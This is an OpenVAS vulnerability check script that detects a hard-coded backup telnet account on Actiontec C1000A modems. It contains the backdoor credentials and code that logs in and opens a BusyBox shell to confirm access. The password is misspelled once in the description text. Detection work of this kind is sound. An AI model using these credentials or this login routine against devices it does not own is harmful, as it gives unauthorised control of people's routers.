###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_actiontec_c1000a_default_telnet_credentials.nasl 13624 2019-02-13 10:02:56Z cfischer $
#
# Actiontec C1000A Modem Backup Telnet Account
#
# Authors:
# Adrian Steins <adrian.steins@greenbone.net>
#
# Copyright:
# Copyright (C) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.112104");
  script_version("$Revision: 13624 $");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("Actiontec C1000A Modem Backup Telnet Account");
  script_tag(name:"last_modification", value:"$Date: 2019-02-13 11:02:56 +0100 (Wed, 13 Feb 2019) $");
  script_tag(name:"creation_date", value:"2017-11-06 10:23:00 +0200 (Mon, 06 Nov 2017)");
  script_category(ACT_ATTACK);
  script_family("Default Accounts");
  script_copyright("This script is Copyright (C) 2017 Greenbone Networks GmbH");
  script_dependencies("telnetserver_detect_type_nd_version.nasl");
  script_require_ports("Services/telnet", 23);
  script_mandatory_keys("telnet/actiontec/modem/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/43118/");

  script_tag(name:"summary", value:"The Actiontec C1000A  modem has a backdoor account with hard-coded credentials.");

  script_tag(name:"impact", value:"This issue may be exploited by a remote attacker to gain full
  access to sensitive information or modify system configuration.");

  script_tag(name:"vuldetect", value:"Connect to the telnet service and try to login with default credentials.");

  script_tag(name:"insight", value:"It was possible to login with backup telnet credentials 'admin:CeturyL1nk'.");

  script_tag(name:"solution", value:"It is recommended to disable the telnet access.");

  script_tag(name:"qod_type", value:"exploit");
  script_tag(name:"solution_type", value:"Mitigation");

  exit(0);
}

include("telnet_func.inc");

port = get_telnet_port( default:23 );
banner = get_telnet_banner( port:port );
if( !banner || "===Actiontec xDSL Router===" >!< banner )
  exit( 0 );

login = "admin";
pass  = "CenturyL1nk";

soc = open_sock_tcp( port );
if( ! soc ) exit( 0 );

recv = recv( socket:soc, length:2048 );

if( "Login:" >< recv ) {
  send( socket:soc, data:login + '\r\n' );
  recv = recv( socket:soc, length:128 );

  if( "Password:" >< recv ) {
    send( socket:soc, data:pass + '\r\n\r\n' );
    recv = recv( socket:soc, length:1024 );

    send( socket:soc, data:'sh\r\n' );
    recv = recv( socket:soc, length:1024 );

    if( "BusyBox" >< recv && "built-in shell" >< recv) {
      VULN = TRUE;
      report = 'It was possible to login via telnet using the following backup credentials:\n\n';
      report += 'Login: ' + login + ', Password: ' + pass;
    }
  }
}

close( soc );

if( VULN ) {
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );